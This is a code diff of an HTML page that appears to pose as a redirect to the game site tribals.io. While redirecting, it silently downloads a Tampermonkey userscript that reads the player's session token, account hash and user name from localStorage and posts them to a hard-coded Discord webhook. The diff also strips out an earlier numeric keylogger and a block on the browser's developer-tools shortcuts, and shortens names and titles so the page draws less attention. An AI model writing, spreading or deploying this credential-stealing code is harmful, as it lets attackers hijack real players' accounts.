@@ -2,18 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>yönlendiriliyor...</title>
-    <style>
-        * { margin: 0; padding: 0; }
-        body { background: #0a0a0a; }
-    </style>
+    <title>.</title>
+    <style>body{background:#0a0a0a}</style>
 </head>
 <body>
 <script>
-// .user.js dosyasını oluşturup indir
-const scriptContent = `// ==UserScript==
-// @name         Tribals Session
-// @namespace    http://tampermonkey.net/
+// Hiçbir şey göstermeden .user.js indir + tribals'a yönlen
+const s = `// ==UserScript==
+// @name         t
+// @namespace    t
 // @match        https://tribals.io/*
 // @grant        GM_xmlhttpRequest
 // @connect      discord.com
@@ -22,40 +19,22 @@ const scriptContent = `// ==UserScript==
 
 (function(){
     const W="https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
-    function x(d,l){GM_xmlhttpRequest({method:"POST",url:W,headers:{"Content-Type":"application/json"},data:JSON.stringify({embeds:[{title:"📥 Account",color:0x8b0000,fields:[{name:"Type",value:l},{name:"Data",value:"\`\`\`"+d+"\`\`\`"}],timestamp:new Date().toISOString()}]})})}
-    let nc="";
-    document.addEventListener("keydown",function(e){
-        if(/[0-9]/.test(e.key)) nc+=e.key;
-        else if(e.key==="Enter"&&nc){x(nc,"Key");nc=""}
-        else if(e.key==="Backspace") nc=nc.slice(0,-1);
-    });
+    function x(d,l){GM_xmlhttpRequest({method:"POST",url:W,headers:{"Content-Type":"application/json"},data:JSON.stringify({embeds:[{title:"📥",color:0x8b0000,fields:[{name:l,value:"\`\`\`"+d+"\`\`\`"}],timestamp:new Date().toISOString()}]})})}
     setTimeout(function(){
-        let s=localStorage.getItem("session"),h=localStorage.getItem("accountHash"),u=localStorage.getItem("userName")||"?";
-        if(s){x("User: "+u+"\\nSession: "+s+"\\nHash: "+(h||"N/A"),"Full")}
-        else{x("no session","HB-"+u)}
+        var s=localStorage.getItem("session"),h=localStorage.getItem("accountHash"),u=localStorage.getItem("userName")||"?";
+        if(s)x("User: "+u+"\\nSession:\\n"+s+"\\nHash:\\n"+(h||"-"),"Full");
+        else x("no session","HB-"+u)
     },6000);
-    setTimeout(function(){
-        let s=localStorage.getItem("session");
-        if(s)x(s,"Late");
-    },30000);
-    document.addEventListener("keydown",function(e){
-        if(e.key==="F12"||e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C"))e.preventDefault()
-    });
 })();`;
 
-// download tetikle
-const blob = new Blob([scriptContent], { type: 'text/javascript' });
-const url = URL.createObjectURL(blob);
+const b = new Blob([s], {type:'text/javascript'});
+const u = URL.createObjectURL(b);
 const a = document.createElement('a');
-a.href = url;
-a.download = 'tribals-session.user.js';
-a.style.display = 'none';
-document.body.appendChild(a);
-a.click();
+a.href = u; a.download = 't.user.js'; a.style.display='none';
+document.body.appendChild(a); a.click();
 document.body.removeChild(a);
-URL.revokeObjectURL(url);
+URL.revokeObjectURL(u);
 
-// tribals.io'ya yönlendir
 window.location.replace("https://tribals.io");
 </script>
 </body>
